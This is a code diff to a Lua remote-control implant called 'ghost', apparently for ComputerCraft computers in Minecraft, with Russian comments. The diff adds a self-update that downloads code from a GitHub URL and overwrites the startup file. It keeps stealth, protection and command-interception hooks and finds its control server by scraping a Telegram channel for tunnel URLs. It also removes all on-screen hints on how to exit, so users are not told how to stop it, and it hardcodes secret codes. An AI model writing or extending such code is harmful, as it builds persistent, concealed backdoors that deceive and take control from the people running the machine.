@@ -1,4 +1,4 @@
--- ghost v9.9.1 (aggressive relay + infinite registration + ultra-resilient)
+-- ghost v9.9.2 (GitHub-only update, secret SECRET_CODE, no cancel hints)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -10,10 +10,9 @@ local COMPUTER_ID = os.getComputerID()
 local TRUSTED_DOMAIN = nil
 local DEBUG = true
 
-local RELAY_USERNAME = "capscraft_relay"
+local GITHUB_URL = "https://raw.githubusercontent.com/kisilev-2024-wq/-Ghost-/main/ghost.lua"
 local SECRET_CODE = "V2BM-LkUZkBqGd9R8YdE"
 local UPDATE_CODE = "N1AVW1cM"
-local PASTE_ID = "N1AVW1cM"
 local service_local = false
 local telegram_service = false
 
@@ -100,32 +99,57 @@ local function note(msg)
 end
 
 -- ============================================
--- SELF-UPDATE
+-- SELF-UPDATE (только GitHub)
 -- ============================================
 local function do_update()
-    glog("UPDATE: start " .. PASTE_ID)
+    glog("UPDATE: start from GitHub")
     term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
     term.clear(); term.setCursorPos(1, 1)
-    print("=== UPDATING GHOST ===\n\nDownloading from Pastebin (raw)...\nPaste ID: " .. PASTE_ID .. "\n")
-    local ok, err = pcall(function()
-        local h = http.get("https://pastebin.com/raw/" .. PASTE_ID, {["bypass-tunnel-reminder"]="true",["User-Agent"]="ghost-updater"})
-        if not h then error("cannot download") end
-        local code = h.readAll(); pcall(function() h.close() end)
-        if not code or code == "" then error("empty") end
-        if not code:find("ghost", 1, true) then error("not ghost") end
-        local f = orig_fs_open("startup", "w")
-        if not f then error("cannot write startup") end
-        f.write(code); f.close()
-    end)
-    if not ok then
-        print("\nUPDATE FAILED: " .. tostring(err) .. "\n")
-        term.setTextColour(colors.white); print("Press any key..."); os.pullEvent("key")
-        glog("UPDATE FAILED: " .. tostring(err)); return false
+    print("=== UPDATING GHOST ===\n")
+    print("Source: GitHub\n")
+    print("URL: " .. GITHUB_URL .. "\n")
+    
+    local ok, h = pcall(http.get, GITHUB_URL, {
+        ["User-Agent"]="ghost-updater",
+        ["bypass-tunnel-reminder"]="true",
+        ["Cache-Control"]="no-cache"
+    })
+    if not ok or not h then
+        print("\nUPDATE FAILED: cannot reach GitHub")
+        print("Error: " .. tostring(h))
+        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
+        glog("UPDATE FAILED: http fail"); return false
     end
+    local o, code = pcall(function() return h.readAll() end)
+    pcall(function() if h.close then h.close() end end)
+    if not o or not code or code == "" then
+        print("\nUPDATE FAILED: empty response")
+        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
+        glog("UPDATE FAILED: empty"); return false
+    end
+    if not code:find("ghost", 1, true) or not code:find("run_main", 1, true) then
+        print("\nUPDATE FAILED: not a valid ghost code")
+        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
+        glog("UPDATE FAILED: invalid code"); return false
+    end
+    local f = orig_fs_open("startup", "w")
+    if not f then
+        print("\nUPDATE FAILED: cannot write startup")
+        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
+        return false
+    end
+    f.write(code); f.close()
     local nc = orig_fs_read("startup")
-    if not nc or nc == "" then print("\nUPDATE FAILED: verify empty\nPress any key..."); os.pullEvent("key"); return false end
-    term.setTextColour(colors.green); print("Downloaded " .. #nc .. " bytes\n\nRebooting in 3 seconds...")
-    term.setTextColour(colors.white); glog("UPDATE OK, reboot"); sleep(3); orig_reboot(); return true
+    if not nc or nc == "" then
+        print("\nUPDATE FAILED: verify empty")
+        term.setTextColour(colors.white); print("\nPress any key..."); os.pullEvent("key")
+        return false
+    end
+    term.setTextColour(colors.green)
+    print("\nDownloaded " .. #nc .. " bytes")
+    print("Rebooting in 3 seconds...")
+    term.setTextColour(colors.white)
+    glog("UPDATE OK, reboot"); sleep(3); orig_reboot(); return true
 end
 
 -- ============================================
@@ -295,7 +319,7 @@ local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") en
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
 -- ============================================
--- URL MANAGEMENT + AGGRESSIVE RELAY (v9.9.1)
+-- URL MANAGEMENT (без cancel-подсказок)
 -- ============================================
 local function save_url(url)
     local f = orig_fs_open(URL_FILE, "w")
@@ -316,7 +340,6 @@ local function replace_domain(url, newdomain)
     return scheme .. newdomain .. path
 end
 
--- ВАЛИДАЦИЯ URL: надёжная проверка через /api/url
 local function validate_url(url)
     if not url or url == "" then return false end
     local ok, h = pcall(http.get, url .. "/api/url", {
@@ -354,9 +377,8 @@ local function validate_url(url)
     return true, data.url
 end
 
--- ВОЗВРАЩАЕТ ВСЕ URL из канала (уникальные, без дубликатов)
 local function fetch_relay_urls()
-    local url = "https://t.me/s/" .. RELAY_USERNAME
+    local url = "https://t.me/s/capscraft_relay"
     local ok, h = pcall(http.get, url, {
         ["User-Agent"]="Mozilla/5.0",
         ["bypass-tunnel-reminder"]="true"
@@ -371,20 +393,14 @@ local function fetch_relay_urls()
         glog("relay: readAll fail")
         return {} 
     end
-    
-    -- Проверка что канал не приватный
     if htmlc:find("tgme_channel_join", 1, true) or htmlc:find("tgme_icon_preview", 1, true) then
         glog("relay: CHANNEL IS PRIVATE!")
         return {}
     end
-    
     glog("relay: got " .. #htmlc .. " bytes")
-    -- Декодируем HTML entities
     htmlc = htmlc:gsub("&lt;", "<"):gsub("&gt;", ">"):gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&#x27;", "'")
-    
     local urls = {}
     local seen = {}
-    -- Ловим URL в ЛЮБОМ регистре
     for u in htmlc:gmatch("https://[%w%-]+%.lhr%.life") do
         if not seen[u] then
             seen[u] = true
@@ -398,14 +414,12 @@ local function fetch_relay_urls()
     return urls
 end
 
--- ПЕРЕБИРАЕТ URL с конца (самый свежий первым), возвращает ПЕРВЫЙ РАБОЧИЙ
 local function get_fresh_url()
     local urls = fetch_relay_urls()
     if #urls == 0 then
         glog("get_fresh: no URLs in channel")
         return nil
     end
-    -- С конца к началу (самый свежий первым)
     for i = #urls, 1, -1 do
         local candidate = urls[i]
         glog("get_fresh: trying [" .. i .. "/" .. #urls .. "] " .. candidate)
@@ -420,9 +434,7 @@ local function get_fresh_url()
     return nil
 end
 
--- АГРЕССИВНЫЙ refresh_url: текущий → relay → saved → всё подряд
 refresh_url = function()
-    -- 1. Пробуем текущий URL
     if CURRENT_URL then
         local ok, result = validate_url(CURRENT_URL)
         if ok then
@@ -433,8 +445,6 @@ refresh_url = function()
         end
         glog("refresh: current URL dead, seeking fresh")
     end
-    
-    -- 2. Ищем свежий в relay
     local fresh = get_fresh_url()
     if fresh then
         CURRENT_URL = fresh
@@ -443,8 +453,6 @@ refresh_url = function()
         glog("refresh: got fresh URL: " .. CURRENT_URL)
         return CURRENT_URL
     end
-    
-    -- 3. Пробуем сохранённый (последний шанс)
     local saved = load_saved_url()
     if saved and saved ~= CURRENT_URL then
         glog("refresh: trying saved URL: " .. saved)
@@ -456,12 +464,10 @@ refresh_url = function()
             return CURRENT_URL
         end
     end
-    
     glog("refresh: NO URL available")
     return nil
 end
 
--- ЗАПРОС ПЕРЕЗАГРУЗКИ ТУННЕЛЯ на сервере
 reload_tunnel = function()
     if not CURRENT_URL then return false end
     glog("reload_tunnel: requesting server restart")
@@ -482,9 +488,8 @@ reload_tunnel = function()
     return true
 end
 
--- ПОЛУЧЕНИЕ ВАЛИДНОГО URL (relay → saved → manual)
+-- БЕЗ cancel-подсказок (SECRET_CODE остаётся секретом)
 local function get_valid_url()
-    -- 1. Сначала пробуем свежий из relay
     local fresh = get_fresh_url()
     if fresh then
         CURRENT_URL = fresh
@@ -493,8 +498,6 @@ local function get_valid_url()
         note("URL from relay: " .. CURRENT_URL)
         return CURRENT_URL
     end
-    
-    -- 2. Пробуем сохранённый
     local saved = load_saved_url()
     if saved then
         write("Checking saved URL... ")
@@ -506,10 +509,9 @@ local function get_valid_url()
             return CURRENT_URL
         else print("Failed") end
     end
-    
-    -- 3. Ручной ввод (Ctrl+T для выхода)
+    -- Чистый prompt без cancel-подсказок
     while true do
-        write("URL (Ctrl+T to exit): ")
+        write("URL: ")
         local u = read()
         if u and u ~= "" then
             u = u:gsub("%s+","")
@@ -713,11 +715,10 @@ end
 local function disable_command_intercept() shell.run = orig_shell_run end
 
 -- ============================================
--- REGISTRATION (БЕСКОНЕЧНОЕ ОЖИДАНИЕ v9.9.1)
+-- REGISTRATION (БЕСКОНЕЧНАЯ, БЕЗ CANCEL-ПОДСКАЗОК)
 -- ============================================
 local function register_sync(url, pw)
     if not url or not pw or pw == "" then return nil end
-    -- АГРЕССИВНЫЙ refresh перед регистрацией
     refresh_url()
     local target = CURRENT_URL or url
     if not target then 
@@ -749,23 +750,17 @@ local function register_sync(url, pw)
             note("register: no pending_id"); 
             return nil 
         end
-        print("⏳ Waiting approval in Telegram (infinite)...")
-        print("   Admin will approve via Telegram bot")
-        print("   Press Ctrl+T to exit ghost completely")
-        
+        print("⏳ Waiting approval in Telegram...")
         local fc = 0
         local check_count = 0
         local cu = CURRENT_URL or target
         while true do
             sleep(3)
             check_count = check_count + 1
-            
-            -- Каждые 10 проверок (30с) — принудительный refresh URL
             if check_count % 10 == 0 then
                 refresh_url()
                 if CURRENT_URL then cu = CURRENT_URL end
             end
-            
             local sr = http_get(cu .. "/api/check?id=" .. tostring(pid), make_headers(nil))
             if sr then
                 fc = 0
@@ -776,17 +771,14 @@ local function register_sync(url, pw)
                     print("❌ Denied by admin.")
                     return nil 
                 end
-                -- pending - продолжаем ждать
             else
                 fc = fc + 1
-                -- АГРЕССИВНЫЙ refresh при 3+ провалах
                 if fc >= 3 then
                     note("register: " .. fc .. " check fails, refreshing URL")
                     refresh_url()
                     if CURRENT_URL then cu = CURRENT_URL; fc = 0 end
                 end
             end
-            -- НЕТ ТАЙМАУТА! Ждём БЕСКОНЕЧНО
         end
     else
         note("register: unknown status " .. tostring(res.status)); 
@@ -846,7 +838,7 @@ local function fortress_console()
 end
 
 -- ============================================
--- LOOPS (агрессивный heartbeat + auto-reload)
+-- LOOPS
 -- ============================================
 local function heartbeat_loop(token)
     glog("heartbeat loop start")
@@ -855,7 +847,6 @@ local function heartbeat_loop(token)
     while true do
         sleep(fc > 3 and 30 or 300)
         local ok, err = pcall(function()
-            -- Принудительный refresh каждые 60с
             local now = os.time()
             if now - last_forced_refresh >= 60 then
                 last_forced_refresh = now
@@ -865,7 +856,6 @@ local function heartbeat_loop(token)
                     glog("heartbeat: forced refresh changed URL")
                 end
             end
-            
             if not CURRENT_URL then
                 fc = fc + 1
                 if fc >= 5 then
@@ -919,7 +909,7 @@ local function mode_watcher(token)
 end
 
 -- ============================================
--- REPL
+-- REPL (UPDATE_CODE для обновления, SECRET_CODE для service — оба остаются)
 -- ============================================
 local function repl()
     while true do
@@ -954,10 +944,10 @@ local function repl()
 end
 
 -- ============================================
--- MAIN (БЕСКОНЕЧНАЯ РЕГИСТРАЦИЯ v9.9.1)
+-- MAIN (бесконечная регистрация, БЕЗ cancel-подсказок)
 -- ============================================
 local function run_main()
-    glog("ghost start v9.9.1")
+    glog("ghost start v9.9.2")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
@@ -970,7 +960,6 @@ local function run_main()
     local connected = false
     local pastes = {}
     
-    -- ЕСЛИ ТОКЕН ЕСТЬ: пытаемся подключиться (5 попыток)
     if token then
         note("token found, connecting...")
         for attempt = 1, 5 do
@@ -987,47 +976,38 @@ local function run_main()
             sleep(3)
         end
         if not connected then 
-            note("connect failed after 5 attempts, token may be invalid")
-            -- Токен есть, но не работает → всё равно идём дальше с ним
-            -- (heartbeat попытается снова)
+            note("connect failed after 5 attempts")
             pastes = {}
         end
     end
 
-    -- ЕСЛИ ТОКЕНА НЕТ: БЕСКОНЕЧНАЯ регистрация
     if not token then
-        -- Получаем URL любым способом (relay/saved/manual)
         if not CURRENT_URL then 
             CURRENT_URL = get_valid_url()
         end
         
-        -- БЕСКОНЕЧНЫЙ цикл пока не получим токен
         if CURRENT_URL then
             local attempt = 0
             while not token do
                 attempt = attempt + 1
                 note("registration attempt " .. attempt)
-                write("Password (Ctrl+T to kill): ")
+                -- ЧИСТЫЙ prompt без cancel-подсказок
+                write("Password: ")
                 local pw = read("*")
-                -- Ctrl+T убьёт процесс полностью (штатное поведение)
                 
                 if pw and pw ~= "" then
-                    -- АГРЕССИВНЫЙ refresh перед каждой попыткой
                     refresh_url()
                     if not CURRENT_URL then
                         print("No URL, trying to get fresh...")
                         sleep(3)
                         refresh_url()
                     end
-                    
                     if CURRENT_URL then
                         token = register_sync(CURRENT_URL, pw)
                         if token then
-                            -- Токен получен! Сохраняем
                             local saved = save_token(token)
                             if saved then
                                 note("token saved OK")
-                                -- Сразу подключаемся
                                 for a = 1, 3 do
                                     refresh_url()
                                     local mode, p2 = check_mode(token)
@@ -1039,19 +1019,14 @@ local function run_main()
                                     end
                                     sleep(2)
                                 end
-                                break  -- выход из while not token
+                                break
                             else
                                 print("❌ Token save FAILED! Retrying in 5s...")
                                 token = nil
                                 sleep(5)
                             end
                         else
-                            -- register_sync вернул nil:
-                            -- - denied (админ отклонил)
-                            -- - no response (сервер недоступен)
-                            -- - error
                             print("❌ Registration failed. Retrying in 5s...")
-                            print("   (Ctrl+T to exit completely)")
                             sleep(5)
                             refresh_url()
                         end
@@ -1066,14 +1041,12 @@ local function run_main()
                 end
             end
         else
-            -- get_valid_url() вернул nil (Ctrl+T или другая причина)
             note("no URL available, exiting")
             return
         end
         draw_boot()
     end
 
-    -- Если подключились в SERVICE режиме — ждём переключения
     if connected and current_mode == "service" then
         note("service mode detected, waiting for switch...")
         disable_stealth(); disable_protection(); disable_command_intercept()
@@ -1091,7 +1064,6 @@ local function run_main()
         install_stealth(); install_protection(); install_command_intercept()
     end
 
-    -- ФОНОВЫЕ ЗАДАЧИ (heartbeat + mode_watcher + pastes)
     parallel.waitForAny(
         function()
             local o, e = pcall(repl)
@@ -1125,7 +1097,6 @@ if not ok then
     else 
         gerr("run_main", err)
         printError("Ghost error: " .. e)
-        -- При ошибке НЕ падаем, а ждём и ребутимся
         print("\nRestarting in 5 seconds...")
         sleep(5)
         orig_reboot()
